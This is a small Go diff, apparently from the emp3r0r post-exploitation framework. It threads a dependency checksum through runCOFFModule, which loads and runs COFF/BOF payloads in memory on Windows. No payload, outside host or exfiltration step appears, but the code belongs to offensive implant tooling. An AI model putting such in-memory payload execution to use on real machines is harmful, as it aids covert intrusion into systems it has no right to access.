@@ -7,6 +7,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
+	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
 	"github.com/jm33-m0/emp3r0r/core/lib/modconfig"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -14,7 +15,7 @@ import (
 // runCOFFModule executes a COFF/BOF payload on Windows via the in-memory
 // COFFLoader dependency. The dependency is fetched on demand, mapped, called
 // once, and unmapped by coffloader.RunCOFFDependency.
-func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr) (out string, err error) {
+func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uintptr, depChecksum string) (out string, err error) {
 	defer func() {
 		if r := recover(); r != nil {
 			err = fmt.Errorf("runCOFFModule panic: %v", r)
@@ -26,7 +27,7 @@ func runCOFFModule(payload []byte, invocation def.ResolvedInvocation, token uint
 		return "", fmt.Errorf("missing COFF invocation data")
 	}
 
-	return coffloader.RunCOFFDependency(payload, invocation.Coff.Export, coffArgsFromInvocation(invocation), token)
+	return coffloader.RunCOFFDependency(payload, invocation.Coff.Export, coffArgsFromInvocation(invocation), token, memdeps.WithChecksum(depChecksum))
 }
 
 // runDLLModule runs an in-memory DLL module (agent_config.type == "dll").
